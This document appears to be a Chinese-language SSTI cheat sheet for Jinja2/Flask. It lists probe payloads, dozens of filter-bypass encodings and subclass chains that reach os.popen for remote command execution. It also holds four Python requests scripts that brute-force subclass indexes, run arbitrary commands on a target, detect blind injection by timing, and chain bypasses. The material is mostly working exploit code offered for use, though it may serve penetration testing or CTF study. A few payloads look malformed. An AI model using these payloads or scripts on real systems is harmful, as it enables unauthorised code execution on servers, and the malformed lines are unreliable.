```jinja2
# SSTI 探测 Payload 大全 - 快速确认漏洞存在

# 基础数学运算探测
{{ 7*7 }}
{{ 10-3 }}
{{ 2**10 }}
{{ 100/10 }}
{{ 1+2 }}
{{ 5-3 }}
{{ 8/2 }}
{{ 3*3 }}

# 字符串操作探测
{{ "hello" }}
{{ "he"+"llo" }}
{{ "A"*10 }}
{{ 'test' }}
{{ "a"~"b" }}

# 类属性基础探测
{{ "".__class__ }}
{{ [].__class__ }}
{{ {}.__class__ }}
{{ ().__class__ }}
{{ request.__class__ }}
{{ config.__class__ }}
{{ session.__class__ }}

# 继承链探测
{{ "".__class__.__base__ }}
{{ "".__class__.__mro__ }}
{{ "".__class__.__bases__ }}
{{ [].__class__.__base__ }}
{{ {}.__class__.__base__ }}

# 过滤器探测
{{ "test"|upper }}
{{ "HELLO"|lower }}
{{ [1,2,3]|length }}
{{ "hello"|reverse }}
{{ "hello"|capitalize }}
{{ ""|attr("__class__") }}
{{ []|attr("__class__") }}

# 环境信息探测
{{ config }}
{{ request }}
{{ session }}
{{ g }}
{{ self }}
{{ lipsum }}
{{ range(5) }}

# 条件语句探测
{% if 1==1 %}true{% endif %}
{% if "".__class__ %}SSTI{% endif %}
{{ 1==1 and "true" or "false" }}

# 循环语句探测
{% for i in [1,2,3] %}{{ i }}{% endfor %}
{% for i in range(3) %}{{ i }}{% endfor %}

# 变量赋值探测
{% set a = "test" %}{{ a }}
{% set b = "".__class__ %}{{ b }}

# 无数字字母探测
{{ request.args.a }}
{{ request.cookies.a }}
{{ request.headers.a }}
{{ (()|select|string|list).__class__ }}
{{ (request|attr("values"))|attr("__class__") }}

# 编码绕过探测 - URL编码
{{ ""["%5f%5f%63%6c%61%73%73%5f%5f"] }}
{{ ""["%5f%5f%62%61%73%65%5f%5f"] }}

# 编码绕过探测 - 16进制
{{ ""["\x5f\x5f\x63\x6c\x61\x73\x73\x5f\x5f"] }}
{{ ""["\x5f\x5f\x62%61%73%65\x5f\x5f"] }}
{{ ""|attr("\x5f\x5f\x63\x6c\x61\x73\x73\x5f\x5f") }}

# 编码绕过探测 - Unicode
{{ ""|attr("\u005f\u005f\u0063\u006c\u0061\u0073\u0073\u005f\u005f") }}
{{ ""|attr("\u005f\u005f\u0062\u0061\u0073\u0065\u005f\u005f") }}

# 编码绕过探测 - Base64编码
{{ ""|attr("X19jbGFzc19f".decode("base64")) }}
{{ ""|attr("X19iYXNlX18=".decode("base64")) }}
{{ ""[("X19jbGFzc19f".decode("base64"))] }}
{{ ""[("X19iYXNlX18=".decode("base64"))] }}

# 编码绕过探测 - Base64混合编码
{{ ""|attr("X1"+"9jbGFzc19f".decode("base64")) }}
{{ ""|attr(("X19"|string)+("Y2xhc3NfXw==".decode("base64"))) }}

# 编码绕过探测 - Rot13编码
{{ ""|attr("__pynff__".translate("abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ","nopqrstuvwxyzabcdefghijklmNOPQRSTUVWXYZABCDEFGHIJKLM")) }}
{{ ""|attr("__onfr__".translate("abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ","nopqrstuvwxyzabcdefghijklmNOPQRSTUVWXYZABCDEFGHIJKLM")) }}

# 编码绕过探测 - 字符拼接
{{ ""|attr("__cla"+"ss__") }}
{{ ""|attr("__"+"class"+"__") }}
{{ ""|attr("__clas"|string+"s__") }}
{{ ""|attr(("__cl"~"ass__")) }}

# 编码绕过探测 - 反转字符串
{{ ""|attr("__ssalc__"[::-1]) }}
{{ ""|attr("__esab__"[::-1]) }}
{{ ""[("__ssalc__"[::-1])] }}

# 编码绕过探测 - 字符替换
{{ ""|attr("__class__".replace("c","c")) }}
{{ ""|attr("__class__".replace("x","c").replace("y","l")) }}

# 编码绕过探测 - HTML实体编码
{{ ""|attr("&#95;&#95;class&#95;&#95;") }}
{{ ""|attr("&#x5f;&#x5f;class&#x5f;&#x5f;") }}

# 编码绕过探测 - 八进制编码
{{ ""|attr("\137\137\143\154\141\163\163\137\137") }}
{{ ""|attr("\137\137\142\141\163\145\137\137") }}

# 编码绕过探测 - 十进制编码
{{ ""|attr("&#95;&#95;&#99;&#108;&#97;&#115;&#115;&#95;&#95;") }}

# 编码绕过探测 - 二进制编码（间接）
{{ ""|attr(().__class__.__bases__[0].__subclasses__()[40]().__class__.__base__.__subclasses__()[40]('01111000011100100110111101100010011000010111001101100101','base',2).decode()) }}

# 编码绕过探测 - 多重编码嵌套
{{ ""|attr("\x5f\x5f\x63\x6c\x61\x73\x73\x5f\x5f".decode("string_escape")) }}
{{ ""|attr(("\u005f\u005f\u0063\u006c\u0061\u0073\u0073\u005f\u005f".encode('utf-8')).decode('unicode_escape')) }}

# 编码绕过探测 - 格式化字符串
{{ ""|attr("%c%c%c%c%c%c%c%c"%(95,95,99,108,97,115,115,95,95)) }}
{{ ""|attr("%c%cclass%c%c"%(95,95,95,95)) }}

# 编码绕过探测 - 从数字构造字符
{{ ""|attr((95).__chr__()+(95).__chr__()+(99).__chr__()+(108).__chr__()+(97).__chr__()+(115).__chr__()+(115).__chr__()+(95).__chr__()+(95).__chr__()) }}

# 编码绕过探测 - 使用join连接
{{ ""|attr(["__","class","__"]|join) }}
{{ ""|attr(["","_","_","c","l","a","s","s","_","_",""]|join) }}

# 编码绕过探测 - 使用列表索引构造
{{ ""|attr(("a","b","__class__","c","d")[2]) }}
{{ ""|attr(["x","y","__class__"][-1]) }}

# 编码绕过探测 - 使用字典取值
{{ ""|attr({"a":"__class__"}.a) }}
{{ ""|attr({"key":"__class__"}["key"]) }}

# 编码绕过探测 - 使用全局变量
{{ ""|attr(lipsum.__globals__.__builtins__.__dict__[chr(95)+chr(95)+chr(99)+chr(108)+chr(97)+chr(115)+chr(115)+chr(95)+chr(95)]) }}

# 编码绕过探测 - 混合编码
{{ ""|attr("__class__")|attr("\u005f\u005fbase\u005f\u005f") }}
{{ ""["__class__"]["\x5f\x5fbase\x5f\x5f"] }}
{{ ""|attr("X19jbGFzc19f".decode("base64"))|attr("\x5f\x5f\x62\x61\x73\x65\x5f\x5f") }}

# 过滤 {{}} 的情况 - 使用 {% %}
{% print(7*7) %}
{% print("".__class__) %}
{% print("test"|upper) %}
{% set x=7*7 %}{{ x }}
{% set y="".__class__ %}{{ y }}

# 过滤 {{}} 的情况 - 使用 {# #} 注释绕过
{# {{ 7*7 }} #}{{ 7*7 }}
{# {{ "".__class__ }} #}{{ "".__class__ }}

# 过滤 {{}} 的情况 - 使用换行和空格
{{
7*7
}}
{{
"".__class__
}}
{{      7*7      }}
{{      "".__class__      }}

# 过滤 {{}} 的情况 - 使用模板语法变种
{%= 7*7 %}
{%= "".__class__ %}
{{= 7*7 }}
{{= "".__class__ }}

# 过滤 {{}} 的情况 - 使用其他模板引擎语法
${7*7}
#{7*7}
[[7*7]]
<<7*7>>
%{7*7}

# 特殊构造探测
{{ ''.__class__ }}
{{ "".__class__ }}
{{ ``.__class__ }}
{{ ''['__class__'] }}
{{ ""['__class__'] }}

# 数字构造探测
{{ 0.__class__ }}
{{ 1.__class__ }}
{{ 3.14.__class__ }}
{{ True.__class__ }}
{{ False.__class__ }}
{{ None.__class__ }}

# 内置函数探测
{{ cycler }}
{{ joiner }}
{{ namespace }}
{{ lipsum }}

# 最小化确认 payload
{{ 7*7 }}
{{ "".__class__ }}
{{ "test"|upper }}

# 快速三步验证
{{ 7*7 }}
{{ "".__class__ }}
{{ "test"|upper }}

# 单payload终极确认
{{ 7*7 }}



-----


原始payload
{{''.__class__}}中__class__被过滤
编码绕过
16进制
{{""["\x5f\x5f\x63\x6c\x61\x73\x73\x5f\x5f"]}}
Unicode
{{""["\u005f\u005f\u0063\u006c\u0061\u0073\u0073\u005f\u005f"]}}

-----

{{""["__cla"+"ss__"]}}
{{""["__cla"+"ss__"]["__ba"+"se__"]}}

{% set a="__cla" %}{% set b="ss__" %}{{''[a~b]}}

{% set a="__cla" %}
{% set b="ss__" %}
{% set c="__ba" %}
{% set d="se__" %}
{{''[a~b][c~d]}}

-----

# 在 Python 中，__builtins__ 是一个模块（或字典，取决于上下文），包含了所有内置函数、异常和属性，比如：
	- eval, exec
	- open
	- __import__
	- chr, ord
	- str, int
	- 等等
{% set chr=url_for.__globals__['__builtins__'].chr %}
{{ ''[chr(95)%2bchr(95)%2bchr(99)%2bchr(108)%2bchr(97)%2bchr(115)%2bchr(115)%2bchr(95)%2bchr(95)] }}
为什么需要 %2b
在 URL 和 HTTP 请求中，加号 `+` 有特殊含义：
	- 在 URL 查询字符串中，`+` 表示空格
	- 在 HTML 表单数据中，`+` 也表示空格
    - %2b 在服务器端会被解码为 `+`这样就能确保加号作为字符串连接符使用，而不是被当作空格
如果我们直接使用 `+` 进行字符串拼接：
{{ ''[chr(95)+chr(95)+chr(99)+chr(108)+chr(97)+chr(115)+chr(115)+chr(95)+chr(95)] }}
服务器可能会将其解析为：
{{ ''[chr(95) chr(95) chr(99) chr(108) chr(97) chr(115) chr(115) chr(95) chr(95)] }}
%2b不行也可换其它连接符如jinja2中的~
{% set chr=url_for.__globals__['__builtins__'].chr %}
{{ ''[chr(95)~chr(95)~chr(99)~chr(108)~chr(97)~chr(115)~chr(115)~chr(95)~chr(95)] }}

format过滤器有时也可以
{% set chr=url_for.__globals__['__builtins__'].chr %}
{% set cls_str = "{0}{1}{2}{3}{4}{5}{6}{7}{8}"|format(chr(95),chr(95),chr(99),chr(108),chr(97),chr(115),chr(115),chr(95),chr(95)) %}
{{ ''[cls_str] }}

{% set chr=url_for.__globals__['__builtins__'].chr %}
{{ ''[chr(95)~chr(95)~chr(99)~chr(108)~chr(97)~chr(115)~chr(115)~chr(95)~chr(95)] }}
builtins被过滤进行绕过
{% set chr=url_for.__globals__['\u005f\u005f\u0062\u0075\u0069\u006c\u0074\u0069\u006e\u0073\u005f\u005f'].chr %}
{{ ''[chr(95)~chr(95)~chr(99)~chr(108)~chr(97)~chr(115)~chr(115)~chr(95)~chr(95)] }}
	
{% set btins_str = '__built' ~ 'ins__' %}
{% set chr=url_for.__globals__[btins_str].chr %}
{{ ''[chr(95)~chr(95)~chr(99)~chr(108)~chr(97)~chr(115)~chr(115)~chr(95)~chr(95)] }}

------

{{7*7}}
输出与下面语句相等
{% set x="aaaaaaa"|length*"aaaaaaa"|length %}{{x}}
正常情况下
{{''.__class__.__base__.__subclasses__()[199].__init__.__globals__['os'].popen('ls /').read()}}
但是数字被过滤了
用length构造199
10*10*2-1=199
{% set x="aaaaaaaaaa"|length*"aaaaaaaaaa"|length*"aa"|length-"a"|length %}{{x}}
{{''.__class__.__base__.__subclasses__()[x].__init__.__globals__['os'].popen('ls /').read()}}

-----

过滤' " + request . [ ]
{% set a=dict(__class__=x)|join %}{{ ()|attr(a) }}

```

```jinja2
## 🚀 SSTI绕过技术速查表

### 1. 基础检测Payload

{{''.__class__}}                    # 检测类访问
{{''['__class__']}}                 # 中括号形式
{{''|attr('__class__')}}            # 过滤器形式
{% if ''.__class__ %}1{% endif %}   # 控制语句检测

### 2. 常用绕过技术

#### 🔥 属性访问绕过

# 点号被过滤
{{''['__class__']}}
{{''|attr('__class__')}}

# 中括号被过滤
{{''.__class__.__base__}}
{{''|attr('__class__')|attr('__base__')}}

#### 🔥 字符串构造绕过

# 字符串拼接
{{''['__cla'+'ss__']}}
{{''['__cla'~'ss__']}}              # Jinja2的~运算符

# 编码绕过
{{''["\x5f\x5f\x63\x6c\x61\x73\x73\x5f\x5f"]}}
{{''["\u005f\u005f\u0063\u006c\u0061\u0073\u0073\u005f\u005f"]}}

# 使用过滤器拼接
{{''[['__cla','ss__']|join]}}
{{''['__claee__'|replace('ee','ss')]}}

#### 🔥 数字绕过

# 使用length构造数字
{% set x="aaaaaaaaaa"|length %}      # 10
{% set y="aaa"|length %}             # 3
{% set index=x*x-y %}                # 10*10-3=97

#### 🔥 引号绕过（使用request）

# GET参数传递
{{().__class__.__base__.__subclasses__().__getitem__(request.args.index)}}?index=117

# POST参数传递
{{().__class__.__base__.__subclasses__().__getitem__(request.form.index)}}

# Cookie传递
{{().__class__.__base__.__subclasses__().__getitem__(request.cookies.index)}}

---

## ⚡ 实战演练脚本

### 脚本1：自动探测可用子类

import requests

def detect_usable_classes(url, param):
    """探测包含os模块的子类"""
    for i in range(300):
        payload = f"{{{{ ''.__class__.__bases__[0].__subclasses__()[{i}].__init__.__globals__.get('os') }}}}"
        data = {param: payload}
        try:
            resp = requests.post(url, data=data, timeout=3)
            if 'os' in resp.text.lower():
                print(f"[+] 索引 {i} 包含os模块")
        except:
            pass

# 使用示例
# detect_usable_classes("http://target.com", "input_param")

### 脚本2：命令执行利用

import requests

def ssti_rce(url, param, cmd, index=117):
    """SSTI命令执行"""
    # 使用request.args绕过引号
    payload = f"""{{{{ ().__class__.__base__.__subclasses__().__getitem__({index}).__init__.__globals__.__getitem__(request.args.popen)(request.args.cmd).read() }}}}"""
    
    data = {param: payload}
    params = {'popen': 'popen', 'cmd': cmd}
    
    resp = requests.post(url, data=data, params=params)
    return resp.text

# 使用示例
# result = ssti_rce("http://target.com", "code", "ls /")
# print(result)

### 脚本3：无回显利用（时间盲注）

import requests
import time

def blind_ssti(url, param):
    """时间盲注探测"""
    for i in range(200):
        payload = f"{{{{ ''.__class__.__bases__[0].__subclasses__()[{i}].__init__.__globals__['popen']('sleep 3').read() }}}}"
        data = {param: payload}
        
        start = time.time()
        try:
            requests.post(url, data=data, timeout=10)
        except:
            pass
        end = time.time()
        
        if end - start > 2.5:
            print(f"[+] 索引 {i} 可能可用 - 响应时间: {end-start:.2f}秒")

# 使用示例
# blind_ssti("http://target.com", "input")

### 脚本4：综合绕过利用

import requests

def advanced_bypass(url, param, cmd):
    """综合绕过技术"""
    # 使用attr过滤器和request参数
    payload = f"""
    {{{{ ''|attr(request.args.a)|attr(request.args.b)|attr(request.args.c)()|attr(request.args.d)(117)|attr(request.args.e)|attr(request.args.f)|attr(request.args.d)(request.args.g)(request.args.h)|attr('read')() }}}}
    """
    
    data = {param: payload}
    params = {
        'a': '__class__', 'b': '__base__', 'c': '__subclasses__',
        'd': '__getitem__', 'e': '__init__', 'f': '__globals__',
        'g': 'popen', 'h': cmd
    }
    
    resp = requests.post(url, data=data, params=params)
    return resp.text

---

## 🛠️ 防御绕过组合拳

### 场景1：过滤了 `_`、`"`、`'`、`+`

{% set xhx = lipsum|string|list|attr('pop')(18) %}  {# 获取_ #}
{% set a = dict(cls=x)|join %}  {# __class__ #}
{{ ''|attr(a) }}

### 场景2：过滤了 `[]`、数字

{% set idx = "aaaaa"|length %}  {# 5 #}
{{ ''.__class__.__base__.__subclasses__().__getitem__(idx) }}

### 场景3：全面过滤

{% set a = dict(__class=x)|join %}
{% set b = dict(__base=x)|join %} 
{% set c = dict(__subclasses=x)|join %}
{% set d = dict(__getitem=x)|join %}
{{()|attr(a)|attr(b)|attr(c)()|attr(d)(117)}}
```

